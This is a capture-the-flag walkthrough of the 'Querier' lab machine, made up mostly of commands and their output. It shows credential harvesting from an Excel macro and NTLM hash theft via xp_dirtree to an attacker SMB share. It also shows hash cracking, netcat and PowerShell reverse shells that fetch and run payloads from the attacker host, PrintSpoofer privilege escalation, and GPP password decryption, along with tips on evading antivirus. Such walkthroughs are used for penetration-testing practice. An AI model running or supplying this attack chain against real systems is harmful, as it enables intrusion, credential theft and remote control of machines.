---
sort : 1
---

# Querier

PORT        STATE   SERVICE         VERSION
135/tcp     open    msrpc           Microsoft Windows RPC
139/tcp     open    netbios-ssn     Microsoft Windows netbios-ssn
445/tcp     open    microsoft-ds?
1433/tcp    open    ms-sql-s        Microsoft SQL Server 2017 14.00.1000.00; RTM
5985/tcp    open    wsman
47001/tcp   open    winrm
5985/tcp    open    http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp   open    http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0


```bash
$ smbclient -N -L \\\\IP

$ smbclient -N \\\\IP\ShareName

smb> get File.xlsm

# you can unzip the xlsm files !!!!!! 
$ unzip File.xlsm

# macros usually stored at xl/vbaProject.bin
$ strings xl/*.bin

# OR !! 
$ olevba File.xlsm 
# VBA MACRO ThisWorkbook.cls 
# in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

# ' macro to pull data for client volume reports
# '
# ' further testing required

# Private Sub Connect()

# Dim conn As ADODB.Connection
# Dim rs As ADODB.Recordset

# Set conn = New ADODB.Connection
# conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
# conn.ConnectionTimeout = 10
# conn.Open

# If conn.State = adStateOpen Then

#   ' MsgBox "connection successful"
 
#   'Set rs = conn.Execute("SELECT * @@version;")
#   Set rs = conn.Execute("SELECT * FROM volume;")
#   Sheets(1).Range("A1").CopyFromRecordset rs
#   rs.Close

# End If

# End Sub
# -------------------------------------------------------------------------------
# VBA MACRO Sheet1.cls 
# in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet1'
# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
# (empty macro)
# +----------+--------------------+---------------------------------------------+
# |Type      |Keyword             |Description                                  |
# +----------+--------------------+---------------------------------------------+
# |Suspicious|Open                |May open a file                              |
# |Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
# |          |                    |used to obfuscate strings (option --decode to|
# |          |                    |see all)                                     |
# +----------+--------------------+---------------------------------------------+
```

the user is "Reporting"
it's password is "PcwTWTHRwryjc$c6"

## Connecting to MSSQL DB

```bash
$ impacket-mssqlclient USERNAME:'PASSWORD'@IP -windows-auth

$ impacket-mssqlclient Reporting:'PcwTWTHRwryjc$c6'@IP -windows-auth
# [-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.

# you should find a user with SA privilege
SQL> select IS_SRVROLEMEMBER ('sysadmin')
# ------   
#  0 

# there isn't any !! 

# we can steal hashes of the SQL service account by using xp_dirtree or xp_fileexist.


# and on another terminal 
$ impacket-smbserver share-kali . -smb2support

# then back to impacket-mssqlclient
SQL> xp_dirtree '\\IP_tun0\share-kali\any.txt'

# look at the smb-server you ran, this will show the NTLM hash of the user !! 

# [*] User QUERIER\mssql-svc authenticated successfully
# [*] mssql-svc::QUERIER:aaaaaaaaaaaaaaaa:f439c56c09a064c19b40fee71273d309:01010000000000000097f8fed4d4d90104f8ab380c1da0d80000000001001000630048004e006500570042005900520003001000630048004e0065005700420059005200020010004e0050005800580067004d006a004100040010004e0050005800580067004d006a004100070008000097f8fed4d4d90106000400020000000800300030000000000000000000000000300000788328683007061b88c05e4481a96893d7adb2d4d910c47adf66d466f8b6f5530a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003600000000000000000000000000
# [*] Connecting Share(1:IPC$)
# [*] Connecting Share(2:share-kali)
# [*] AUTHENTICATE_MESSAGE (\,QUERIER)
# [*] User QUERIER\ authenticated successfully
# [*] :::00::aaaaaaaaaaaaaaaa


$ echo "mssql-svc::QUERIER:aaaaaaaaaaaaaaaa:59e20e11c6e191c8ec687d9227d6f074:0101000000000000002f2676c5d4d90181d517003f90cf7e000000000100100041007a004800770071007700410079000300100041007a00480077007100770041007900020010007700580070004b0057004e004b004900040010007700580070004b0057004e004b00490007000800002f2676c5d4d90106000400020000000800300030000000000000000000000000300000788328683007061b88c05e4481a96893d7adb2d4d910c47adf66d466f8b6f5530a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003600000000000000000000000000" > hash

$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt # corporate568

$ impacket-mssqlclient mssql-svc:'corporate568'@IP -windows-auth
SQL> select IS_SRVROLEMEMBER ('sysadmin')
# ------   
#  1 

SQL> enable_xp_cmdshell # success !! 
SQL> xp_cmdshell "type ..\..\Users\mssql-svc\Desktop\user.txt"

# to get a reverse shell, and bypass the AV 
# install nc64.exe from github https://github.com/int0x33/nc.exe/
# download nc64.exe on the smb-server on the attacker machine.

SQL> xp_cmdshell "copy \\IP_tun0\share-kali\nc64.exe C:\Users\Public\nc64.exe"

# why we copied it to the Public folder ..... cuz it's mostly writable !! 

$ nc -lnvp 1234

SQL> xp_cmdshell "C:\Users\Public\nc64.exe -e cmd.exe IP_tun0 1234" 

C:\Windows\system32> # Good luck

C:\Windows\system32> whoami /all

C:\Windows\system32> whoami /priv
# PRIVILEGES INFORMATION
# ----------------------

# Privilege Name                Description                               State   
# ============================= ========================================= ========
# SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
# SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
# SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
# SeImpersonatePrivilege        Impersonate a client after authentication Enabled   ==> this always can be exploited 
# SeCreateGlobalPrivilege       Create global objects                     Enabled 
# SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

### nishang reverse shell 

> https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

```tip
since Invoke-PowerShellTcp.ps1 is a module, running the reverse shell in one line could not work, so it's better to add the function you wanna call at the end of the module so you can run it directly !!

.EXAMPLE - add this line at the end
Invoke-PowerShellTcp -Reverse -IPAddress IP_tun0 -Port 4444
```

on 3 terminals

```bash
$ python3 -m http.server 4444
```

```bash
$ nc -lnvp 1234
```

```bash
SQL> xp_cmdshell "powershell -c iex(iwr http://IP_tun0:4444/shell.ps1)"
```

```note
some times due to windows firewall, you need to make your netcat listen on port 80 or 443 
```

### hoaxshell reverse shell

### reverse shell generator reverse shell


```tip
pick the method that bypasses the AV  
```

<!-- ## ntlm relay

## what is mssql-svc


type of windows accounts: 
* user aacount 
* machine account
* service account ======> mostly it has the SeImpersonatePrivilege enabled !! 

## SE impersonate

## access tockens exploits hack

### what are Access Tokens

https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/access-tokens 

Each user logged onto the system holds an access token with security information for that logon session. The system creates an access token when the user logs on. Every process executed on behalf of the user has a copy of the access token. The token identifies the user, the user's groups, and the user's privileges. A token also contains a logon SID (Security Identifier) that identifies the current logon session.

When a local administrator logins, two access tokens are created: One with admin rights and other one with normal rights. By default, when this user executes a process the one with regular (non-administrator) rights is used. When this user tries to execute anything as administrator ("Run as Administrator" for example) the UAC will be used to ask for permission.
If you want to learn more about the UAC read this page. -->

```bash
$ nc -lnvp 1235
```

```powershell
C:\Windows\system32> PrintSpoofer64.exe -c "rev.exe IP_tun0 1235 -e cmd.exe"
```

```tip
PrintSpoofer :: used mostly when you have a service account
JuicyPotato  :: used mostly when you have a user account
```


## gpp vulnerability privilege escalation

```powershell
# After running Powerup

PS> cat ​'C:\ProgramData\Microsoft\Group
Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\G
roups\Groups.xml'
```

To decrypt the Administrator password

```python
from Crypto.Cipher import AES
from base64 import b64decode

cpassword = "CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ"

# From MSDN: http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29 #endNote2

key = ​"""
4e 99 06 e8 fc b6 6c c9 fa f4 93 10 62 0f fe e8
f4 96 e8 06 cc 05 79 90 20 9b 09 a4 33 b6 6c 1b
"""​.replace(​" "​,​""​).replace(​"\n"​,​""​).decode(​'hex'​)

# Add padding to the base64 string and decode it
cpassword += ​"="​ * ((4 - len(cpassword) % 4) % 4)
password = b64decode(cpassword)

# Decrypt the password
o = AES.new(key, AES.MODE_CBC, ​"\x00"​ * 16).decrypt(password)

# Print it
print​ o[:-ord(o[-1])].decode(​'utf16'​)
```

Good luck ^^

```bash
$ python3 psexec.py Administrator:​'MyUnclesAreMarioAndLuigi!!1!'​@IP
```

























